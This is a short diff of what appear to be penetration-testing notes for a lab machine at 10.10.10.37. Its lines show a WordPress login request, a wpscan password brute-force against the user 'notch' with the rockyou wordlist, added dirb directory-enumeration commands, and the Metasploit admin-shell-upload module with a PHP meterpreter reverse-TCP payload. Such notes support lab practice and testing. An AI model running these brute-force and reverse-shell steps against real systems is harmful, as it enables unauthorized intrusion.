@@ -88,8 +88,14 @@ log=notch&pwd=testpass&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.10.37%2Fw
 ./wpscan.rb -u http://10.10.10.37 -U notch -w /usr/share/wordlists/rockyou.txt -t 16
 
 
+dirb <url_base> [<wordlist_file(s)>] [options]
+dirb http://10.10.10.37 common.txt
+
+
 exploit(wp_admin_shell_upload)
 php/meterpreter/reverse_tcp
+
+
 
 
 
